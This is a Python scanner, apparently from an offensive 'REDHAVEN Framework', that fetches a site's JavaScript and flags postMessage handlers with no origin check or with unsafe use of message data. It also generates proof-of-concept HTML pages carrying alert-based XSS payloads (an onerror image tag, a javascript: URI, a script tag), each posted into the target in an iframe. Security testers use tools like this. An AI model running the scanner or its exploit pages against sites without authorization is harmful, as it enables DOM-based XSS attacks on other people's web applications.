#!/usr/bin/env python3
"""
PostMessage Security Analyzer - REDHAVEN Framework
Detects insecure postMessage handlers and DOM-based vulnerabilities
"""

import sys
import argparse
import re
import requests
from urllib.parse import urlparse
from typing import List, Dict, Set

BANNER = """
╔══════════════════════════════════════════════════════════╗
║  POSTMESSAGE ANALYZER - DOM XSS & Origin Bypass          ║
║  Part of REDHAVEN Framework v1.2.2                       ║
╚══════════════════════════════════════════════════════════╝
"""

# Dangerous patterns in postMessage handlers
DANGEROUS_PATTERNS = {
    'eval': r'eval\s*\(\s*[\w\.]+\.data',
    'innerHTML': r'innerHTML\s*=\s*[\w\.]+\.data',
    'document.write': r'document\.write\s*\(\s*[\w\.]+\.data',
    'location': r'(?:window\.)?location(?:\.href)?\s*=\s*[\w\.]+\.data',
    'script_creation': r'createElement\s*\(\s*["\']script["\']',
}

# Missing origin validation patterns
ORIGIN_CHECKS = [
    r'event\.origin\s*(?:==|===)',
    r'event\.source\.origin',
    r'indexOf\s*\(\s*event\.origin',
    r'startsWith\s*\(\s*event\.origin',
]

class PostMessageAnalyzer:
    def __init__(self):
        self.findings = []
    
    def analyze_js_code(self, js_code: str, source_url: str) -> List[Dict]:
        """Analyze JavaScript code for insecure postMessage handlers."""
        findings = []
        
        # Find all addEventListener('message') handlers
        message_handlers = re.finditer(
            r'addEventListener\s*\(\s*["\']message["\']\s*,\s*(?:function\s*\((\w+)\)|(\w+)\s*=>)',
            js_code,
            re.IGNORECASE | re.DOTALL
        )
        
        for match in message_handlers:
            handler_start = match.start()
            
            # Extract the handler function (simple heuristic: next 500 chars)
            handler_code = js_code[handler_start:handler_start + 1000]
            
            # Check for origin validation
            has_origin_check = any(re.search(pattern, handler_code, re.IGNORECASE) 
                                  for pattern in ORIGIN_CHECKS)
            
            if not has_origin_check:
                findings.append({
                    'type': 'MISSING_ORIGIN_CHECK',
                    'severity': 'HIGH',
                    'source': source_url,
                    'description': 'postMessage handler without origin validation',
                    'code_snippet': handler_code[:200]
                })
            
            # Check for dangerous operations
            for danger_name, danger_pattern in DANGEROUS_PATTERNS.items():
                if re.search(danger_pattern, handler_code, re.IGNORECASE):
                    findings.append({
                        'type': f'DANGEROUS_OPERATION_{danger_name.upper()}',
                        'severity': 'CRITICAL',
                        'source': source_url,
                        'description': f'postMessage data used in {danger_name}',
                        'code_snippet': handler_code[:200]
                    })
        
        return findings
    
    def fetch_and_analyze_js(self, js_url: str) -> List[Dict]:
        """Fetch JavaScript file and analyze it."""
        print(f"[*] Analyzing: {js_url}")
        
        try:
            response = requests.get(js_url, timeout=10)
            if response.status_code == 200:
                findings = self.analyze_js_code(response.text, js_url)
                
                if findings:
                    print(f"    [!] Found {len(findings)} issues")
                    for finding in findings:
                        print(f"        - {finding['type']}: {finding['description']}")
                else:
                    print(f"    [+] No issues found")
                
                return findings
            else:
                print(f"    [-] HTTP {response.status_code}")
        except Exception as e:
            print(f"    [-] Error: {e}")
        
        return []
    
    def discover_js_files(self, base_url: str) -> Set[str]:
        """Discover JavaScript files from a base URL."""
        print(f"\n[*] Discovering JavaScript files from: {base_url}")
        
        js_files = set()
        
        try:
            response = requests.get(base_url, timeout=10)
            if response.status_code != 200:
                return js_files
            
            # Extract script src attributes
            script_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', response.text, re.IGNORECASE)
            
            parsed_base = urlparse(base_url)
            base_domain = f"{parsed_base.scheme}://{parsed_base.netloc}"
            
            for src in script_srcs:
                if src.startswith('http'):
                    js_files.add(src)
                elif src.startswith('//'):
                    js_files.add(f"{parsed_base.scheme}:{src}")
                elif src.startswith('/'):
                    js_files.add(f"{base_domain}{src}")
                else:
                    # Relative path
                    js_files.add(f"{base_domain}/{src}")
            
            print(f"    [+] Found {len(js_files)} JavaScript files")
            
        except Exception as e:
            print(f"    [-] Error: {e}")
        
        return js_files
    
    def generate_poc_html(self, finding: Dict) -> str:
        """Generate PoC HTML for exploitation."""
        if 'innerHTML' in finding['type']:
            payload = '<img src=x onerror=alert(document.domain)>'
        elif 'eval' in finding['type']:
            payload = 'alert(document.domain)'
        elif 'location' in finding['type']:
            payload = 'javascript:alert(document.domain)'
        else:
            payload = '<script>alert(document.domain)</script>'
        
        poc_html = f"""<!DOCTYPE html>
<html>
<head><title>PostMessage PoC</title></head>
<body>
<h1>PostMessage Exploit PoC</h1>
<p>Target: {finding['source']}</p>
<iframe id="target" src="{finding['source']}" width="800" height="600"></iframe>
<script>
setTimeout(function() {{
    var target = document.getElementById('target').contentWindow;
    target.postMessage({repr(payload)}, '*');
}}, 2000);
</script>
</body>
</html>"""
        
        return poc_html

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(description="PostMessage Security Analyzer")
    parser.add_argument('-u', '--url', help='Target URL to analyze')
    parser.add_argument('-f', '--file', help='File containing JS URLs')
    parser.add_argument('-j', '--js-dir', help='Directory with downloaded JS files')
    parser.add_argument('--generate-poc', action='store_true', help='Generate PoC HTML files')
    
    args = parser.parse_args()
    
    analyzer = PostMessageAnalyzer()
    
    js_urls = set()
    
    # Collect JS URLs
    if args.url:
        js_urls.update(analyzer.discover_js_files(args.url))
    
    if args.file:
        try:
            with open(args.file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and line.endswith('.js'):
                        js_urls.add(line)
        except Exception as e:
            print(f"[X] Error reading file: {e}")
    
    if args.js_dir:
        import os
        try:
            for filename in os.listdir(args.js_dir):
                if filename.endswith('.js'):
                    filepath = os.path.join(args.js_dir, filename)
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                        js_code = f.read()
                        findings = analyzer.analyze_js_code(js_code, filename)
                        analyzer.findings.extend(findings)
        except Exception as e:
            print(f"[X] Error reading directory: {e}")
    
    if not js_urls and not args.js_dir:
        print("[X] No JavaScript sources specified")
        print("Usage: python3 postmessage_analyzer.py -u https://target.com")
        sys.exit(1)
    
    # Analyze remote JS files
    for js_url in js_urls:
        findings = analyzer.fetch_and_analyze_js(js_url)
        analyzer.findings.extend(findings)
    
    # Report findings
    print("\n" + "="*70)
    if analyzer.findings:
        print(f"[+] FOUND {len(analyzer.findings)} POSTMESSAGE VULNERABILITIES")
        print("="*70)
        
        critical = [f for f in analyzer.findings if f['severity'] == 'CRITICAL']
        high = [f for f in analyzer.findings if f['severity'] == 'HIGH']
        
        print(f"\n[!!!] CRITICAL: {len(critical)}")
        for finding in critical:
            print(f"  >> {finding['source']}")
            print(f"     Type: {finding['type']}")
            print(f"     {finding['description']}")
        
        print(f"\n[!] HIGH: {len(high)}")
        for finding in high:
            print(f"  >> {finding['source']}")
            print(f"     {finding['description']}")
        
        # Generate PoCs
        if args.generate_poc and critical:
            print(f"\n[*] Generating PoC files...")
            for i, finding in enumerate(critical[:5]):  # Top 5
                poc_html = analyzer.generate_poc_html(finding)
                filename = f"postmessage_poc_{i+1}.html"
                with open(filename, 'w') as f:
                    f.write(poc_html)
                print(f"    [+] Created: {filename}")
    else:
        print("[-] No postMessage vulnerabilities detected")
    print("="*70)

if __name__ == '__main__':
    main()
